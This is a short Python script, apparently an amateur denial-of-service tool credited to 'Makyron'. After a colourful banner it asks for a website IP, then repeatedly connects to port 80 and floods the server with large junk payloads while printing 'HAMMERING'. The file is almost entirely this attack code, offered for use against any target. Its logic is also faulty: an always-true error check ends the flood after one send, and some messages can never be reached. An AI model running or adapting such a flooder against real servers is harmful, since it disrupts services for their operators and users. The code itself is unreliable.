import socket
import os
import time
import sys
#start coding
blue = "\033[0;34m"
red = "\033[0;31m"
green = "\033[1;32m"
white = "\033[0;37m"
print(red+"--------------------------------")
print(blue+" ──")
print(blue+"│  │")
print(blue+"│  │")
print(blue+"│  │")
print(blue+"│  │")
print(blue+"│  │______            ", white,"／ ＼_")
print(blue+"│         \           ", white,"＼_   ＼")
print(blue+"│  ─────   \        ", red,"／ ",white,"＼_／")
print(blue+"│  │    │  │     ", red," ／  ／")
print(blue+"│  │    │  │    ", red,"／  ／")
print(blue+"│  │    │  │  ", red,"／  ／")
print(blue+"│  │    │  │  ", red,"＼／")
print(blue+" ──      ── ")
print(red+"-------------------------------")
time.sleep(0)
print(green+"Hello brother:)")
time.sleep(0)
print("Welcome to this script!")
time.sleep(0)
print("We Are Makyron:)")
time.sleep(0)
print("Author:HAMM-WISS")
print(red+"-------------------------------")
time.sleep(1)
ip=str(input("ENTER WEBSITE IP:"))
def DossWeb(ip):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,80))
    a = 0
    b = 5000
    while True:
        f = a +1 * b
        data = ("iyddgoxoydxoxoxhlddlddiydiixkxkgdgkkgxlxkxgkxhlxhkxhlchlf") *f
        data = str(data).encode("utf-8")
        sock.send(data)
        print("HAMMERING " +ip+ "...|MAKYRON")
        if socket.error:
            break;
            print ("[!] Faild HAMMERING [+]")
            print ("[+] Maybe Server is Dead [+]")
while True:
    os.system("clear")
    time.sleep(1)
    for data in range(100):
        DossWeb(ip)
